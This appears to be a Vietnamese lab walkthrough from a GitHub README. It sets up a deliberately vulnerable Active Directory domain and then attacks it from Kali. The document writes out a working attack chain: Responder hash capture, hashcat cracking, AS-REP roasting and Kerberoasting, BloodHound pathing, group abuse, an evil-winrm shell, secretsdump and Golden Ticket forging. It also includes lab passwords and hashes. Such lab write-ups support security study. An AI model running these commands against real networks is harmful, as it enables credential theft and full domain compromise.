# Windows-Privilege-Escalation
Leo thang đặc quyền để có được tài liệu và quyền 

# Thay đổi chính sách thực thi

Các bước cài đặt:
1) ***Thay đổi chính sách***
```Bash
Set-ExecutionPolicy -ExecutionPolicy Bypass
```
![Thay đổi chính sách](https://github.com/user-attachments/assets/c33adb05-6415-40df-8621-c9ff7fc3f181)

2) ***Cài đặt dịch vụ Active Directory Domain Services (AD DS) trên Windows Server***
```Bash
Install-windowsfeature AD-domain-services
```
![Cài Active Directory Domain Services_Collecting Data](https://github.com/user-attachments/assets/01620801-37e3-4b78-af53-2f50be0b48e7)

____
![Success](https://github.com/user-attachments/assets/59533700-d433-4fb8-b63b-53eecf3a80d8)

3) ***Nạp module ADDSDeployment để sử dụng các lệnh liên quan đến triển khai ADDS***
```Bash
Import-Module ADDSDeployment
```
![Nạp Module ADDS](https://github.com/user-attachments/assets/2ecbffc8-363a-4e24-a454-cbc85088105c)

4) ***Tạo Active Directory Forest ATTT.ptit***
```Bash
Install-ADDSForest -CreateDnsDelegation:$false -DatabasePath "C:\Windows\NTDS" -DomainMode "7" -DomainName "ATTT.ptit" -DomainNetbiosName "ATTT" -ForestMode "7" -InstallDns:$true -LogPath "C:\Windows\NTDS" -NoRebootOnCompletion:$false -SysvolPath "C:\Windows\SYSVOL" -Force:$true
```
![Installing-ADDSForest](https://github.com/user-attachments/assets/7462772e-540d-407c-a893-39f74c17c8a6)
___
![Success_And_need_restart](https://github.com/user-attachments/assets/a8230e1e-9dcb-4d12-ae93-7b2d64306744)

__
Đã có domain ATTT.ptit

![ATTT.ptit](https://github.com/user-attachments/assets/39133b7c-2cd4-42f6-96f0-970125d8f185)

5) ***Tạo cấu trúc AD dễ bị tấn công.
   Tạo người dùng, nhóm với quyền hạn không an toàn***
![Nạp Module vulnadplus.ps1](https://github.com/user-attachments/assets/1b2e5acb-eaaa-4b49-9a0f-757b737e2a43)
____ Thành công
![Success](https://github.com/user-attachments/assets/bf3d7992-f6d6-47a0-a301-a178667e173a)


# Quét lỗ hổng, lấy thông tin người dùng cơ bản
Máy attack : Kali
Máy victim : Window Server
Ta biết hai máy này cùng dải địa chỉ
IP của Kali : 192.168.168.2
![IP_Kali](https://github.com/user-attachments/assets/068bf831-fae0-4a48-9b87-fa3c6019f200)
___Nmap
```Bash
nmap 192.1689.168.0/24
```
![Nmap](https://github.com/user-attachments/assets/e7594472-1d24-4d5e-a7ff-7dc3d319766a)
Quét ra 4 địa chỉ :
- 192.168.168.1
- 192.168.168.13
- 192.168.168.254
- 192.168.168.2

__Dùng Crackmapexec , quét giao thức SMB trong dải địa chỉ 192.168.168.0/24
```Bash
crackmapexec smb 192.168.168.0.24
```
![crackmapexec](https://github.com/user-attachments/assets/1784a766-5d30-4f81-9dad-88af20ece2e8)
Ta thấy có máy SERVER_PTIT __ IP 192.168.168.13

__ Dùng Responder xem có ai viết sai tên trong quá trình tìm kiếm domain__
Khi người dùng nhập thiếu tên, ví dụ chỉ nhập ATTT và thiếu .ptit
DNS không phân giải được địa chỉ và hỏi các mạng xung quanh xem có biết địa chỉ "ATTT" ở đâu không
Responder sẽ trả lời nó biết, yêu cầu nạn nhân cung cấp thông tin
Từ đó ta có mã hash và tên nạn nhân

```Bash
sudo responder -I eth0 -d -w -v
// -I eth0: giao diện eth0
// -d : mode domain, tạo môi trường giả lập DNS, SMB để lừa các máy tính khác trong mạng
// -w: giả làm máy chủ web
// -v: verbose(chi tiết) : hiển thị thông tin chi tiết
```
![responder](https://github.com/user-attachments/assets/9467d5bc-b1b6-4f2e-8869-2ee313924553)

___Win10 nhập tên domain không đủ
![Tên domain chưa đủ](https://github.com/user-attachments/assets/66b18bb2-2b84-499c-a549-6c5ca6f8a896)

___ Ở phía Kali
![Có mã hash](https://github.com/user-attachments/assets/23aac742-e09b-4620-a4bc-2877ee5dad91)

Ta có mã hash của nạn nhân đầu tiên
Ta lưu vào hash.txt
Giải mã bằng hashcat , lưu mật khẩu vào pass.txt
```Bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt -o pass.txt
```
![Hashcat](https://github.com/user-attachments/assets/8ee622ce-856b-43c9-ab29-a9ad41489ae6)

___ cat pass.txt
![cat pass.txt](https://github.com/user-attachments/assets/aa582bcc-010b-489c-9260-eb78729333bb)

***Liệt kê người dùng trong domain***
```Bash
ldapsearch -x -H ldap://192.168.168.13 -b "DC=ATTT,DC=ptit" | grep "userPrincipalName" | awk 'NF{print $NF}' | awk -F '@' '{print $1}' > users
```
![LdapSearch](https://github.com/user-attachments/assets/6cdfaea5-107b-4c37-9ea6-f86e38bd1bb3)

___ Có một vài Domain Admin khi tạo tài khoản sẽ ghi mật khẩu ở phần ghi chú
Nên ta có thể lọc đầu ra để xem phần description
![description](https://github.com/user-attachments/assets/661ff9bc-8458-4fde-8bed-627df971bbf2)
Ta thấy có 3 mật khẩu cùng với 4 tài khoản có mật khẩu mặc định của công ty
Ta lưu những mật khẩu này vào password.txt để dùng sau
![password.txt](https://github.com/user-attachments/assets/341e3e70-e863-4e36-a3d3-1a4f515958bd)

***Tấn công không yêu cầu xác thực trước***
```Bash
impacket-GetNPUsers ATTT.ptit/ -no-pass -usersfile users -format hashcat -outputfile domainhash.txt -dc-ip 192.168.168.13
// impacket: công cụ khai thác AS-REP Roasting
// NPUsers: tài khoản "Do not require Kerberos preauthentication"
// -no-pass: truy vấn mà không cần cung cấp mật khẩu
// users: file users có được từ việc chạy ldapsearch
// -format hashcat: định dạng đầu ra Hashcat để có thể bẻ khóa sauu đó
```
![GetNPUsers](https://github.com/user-attachments/assets/d9625687-845e-4f1a-863c-8bb175d730e2)

***Dùng hashcat giải mã những tài khoản có thể tấn công NO Require Preauthentication***
```Bash
hashcat domainhash.txt /usr/share/wordlists/rockyou.txt -o passdomain.txt
```
![NoPreauthentication](https://github.com/user-attachments/assets/bcd3d6f0-86f6-40c2-866b-f56be0cad87c)
Ta có cách mật khẩu là : andrew, hardcore,...

***Thu thập thông tin người dùng, nhóm, máy tính, OU, GPO từ Acitve Directory***
```Bash
ldapdomaindump 192.168.168.13 -u 'ATTT.ptit\Dasya.Hanni' -p 'q1w2e3r4t5'
```
![OU_GPO](https://github.com/user-attachments/assets/acf60f1e-0fe0-4f0a-ad9f-b9af25fe632f)
___Đầu ra là những file json để phân tích
domain_users.json – Danh sách người dùng trong AD.
domain_groups.json – Danh sách các nhóm trong AD.
domain_computers.json – Danh sách máy tính trong domain.
domain_admins.json – Danh sách tài khoản quản trị viên.
group_memberships.json – Mối quan hệ giữa các nhóm và thành viên.
domain_gpos.json – Danh sách Group Policy Objects (GPO).
domain_trusts.json – Danh sách các mối quan hệ trust giữa các domain.

***Blood Hound _dữ liệu đồ thị***
Ta dùng BloodHound để tìm tài khoản và đường đi để leo thang đặc quyền
1) Thu thạp dữ liệu domain cho BloodHound
```Bash
bloodhound-python -d ATTT.ptit -u Dasya.Hanni -p 'q1w2e3r4t5' -c all --dns-tcp -ns 192.168.168.13
```
__Ta có các file .json để up lên BloodHound
![FileBloodHound](https://github.com/user-attachments/assets/11c79ba0-726c-4523-ac8b-3e947c7e1ad4)

___ Khởi chạy neo4j( Graph Database0
![neo4j](https://github.com/user-attachments/assets/24d35334-5af3-488e-bc12-d2280c90a5c5)
__ Vào http://localhost:7474/
__ Mở BloodHound  và upload file 
__Ta đánh dấu những tài khoản đã có mật khẩu là Owned cho dễ nhận biết
![Owned](https://github.com/user-attachments/assets/6c0ccb9e-4e64-46eb-a107-1f63f0466721)
__ Dùng hàm List all Kerberoastable Accounts 
để liệt kê những người dùng có thể tấn công Kerberoastable
![Kerberoastable Accounts](https://github.com/user-attachments/assets/66fb60a9-2071-4038-ab3a-612c11b97338)
__Lấy mã hash của những tài khoản có quyền cao hơn:
```Bash
impacket-GetUserSPNs -request -dc-ip 192.168.168.13 ATTT.ptit/Dasya.Hanni:q1w2e3r4t5 -o kerberoastable.txt
```
![User quyền cao](https://github.com/user-attachments/assets/badf235d-b727-495c-87d1-2913311ea646)

__ Chạy hashcat cùng password-list để có mật khẩu của những tài khoản quyền cao:
```Bash
hashcat kerberoastable.txt 10-million-password-list-top-1000000.txt -o passdomain.txt
```
![Pass Domain](https://github.com/user-attachments/assets/ae6bd25b-710b-47ac-b63f-ab8f942cc062)
__ta được 2/4 tài khoản

***Leo thang đặc quyền***
Dùng hàm Shortest Paths from Kerberoastable Users
Chọn mục tiêu là server ATTT.ptit
Tài khoản thì ta thấy có HTTP_SVC là có kết quả trả về
![Hàm shortest](https://github.com/user-attachments/assets/0b7227f0-fb5e-44bb-9c6e-f08ba0102ef9)
_Xem trợ giúp bằng chuột phải vào những cung giữa các nốt để có thể leo thang dần dần
![Help](https://github.com/user-attachments/assets/2f2318dc-3cb4-40c3-91d4-dbefc4a14eb6)

__Ta add thành công HTTP_SVC vào nhóm OFFICE ADMIN 
```Bash
net rpc group addmem "OFFICE ADMIN" "HTTP_SVC" -U "ATTT.ptit/HTTP_SVC%panther" -S 192.168.168.13
```
```Bash
///Kiểm tra xem member đã có trong group chưa
net rpc group members "OFFICE ADMIN" -U "ATTT.ptit/HTTP_SVC%panther" -S 192.168.168.13
```
![ADD member](https://github.com/user-attachments/assets/e0c6f41f-d555-4d17-a865-e1d79202f1c6)



***Evil winrm***
Lấy shell , và có thể tải mã độc, download file,...
```Bash
evil-winrm -i 192.168.168.13 -u HTTP_SVC -p panther
```
![Success](https://github.com/user-attachments/assets/43b71a46-ff17-4027-bd58-e064fe1ef1ed)
Tôi đã chạy whoami

***Secret Dump***
Lấy mã hash tất cả tài khoản trong domain:
```Bash
impacket-secretsdump ATTT.ptit/HTTP_SVC:panther@192.168.168.13 > credentials.txt
```
![Credential](https://github.com/user-attachments/assets/27f3e17f-6212-4cfa-9586-0cf9dcee2f37)

***Golden ticket***
Lọc mã hash của tài khoản krb
__ Lấy mã hash của tài khoản Admin
```Bash
cat credentials.txt| grep "Admin"
```
![Admin](https://github.com/user-attachments/assets/c855eafb-c4db-478e-9940-81504b91c23c)
__Dùng Lookupsid và có được DomainSID:
```Bash
impacket-lookupsid ATTT.ptit/Administrator@192.168.168.13 -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:d6ddea1e46488f7caae44c2e3ad9368d| grep -i 'domain sid'
```
![Domain SID](https://github.com/user-attachments/assets/2d3ae89a-de56-4f8c-9815-3a764f5eacec)

__Lấy mã hash của krbtgt:aes128 
```Bash
cat credentials.txt| grep "krb"
```
![krb](https://github.com/user-attachments/assets/bb84394f-5b7b-4757-81e5-afb3d9129530)


***Ticketer***
Kết hợp mã hash và SID  để có Golden Ticket
```Bash
impacket-ticketer -aesKey 5cada99bd47933055f956d22db5808a4 -domain-sid S-1-5-21-485854576-312391858-2906987710 -domain ATTT.ptit Administrator
```
![Ticketer](https://github.com/user-attachments/assets/4547eaeb-a674-4403-abfa-9c8d4fd46019)

___ Export ticket vừa lấy được
```Bash
export KRB5CCNAME=Administrator.ccache
```
![export](https://github.com/user-attachments/assets/05b24e6e-2465-42e6-a9dd-4afdbefb3316)

__ Tải krb5-user để có thể dùng klist kiểm tra ticket
```Bash
sudo apt install krb5-user
```
![krb5-user](https://github.com/user-attachments/assets/87bea2f8-fee4-42d3-99ee-b7b61298bd82)

__Kiểm tra vé
```Bash
klist
```
![klist](https://github.com/user-attachments/assets/1d26acf7-5980-4a4c-8cdf-275f56a47eb1)

***Dùng Ticket để đăng nhập***

![Ticket](https://github.com/user-attachments/assets/4bcecd00-db1a-474b-b0aa-35a38e14b040)






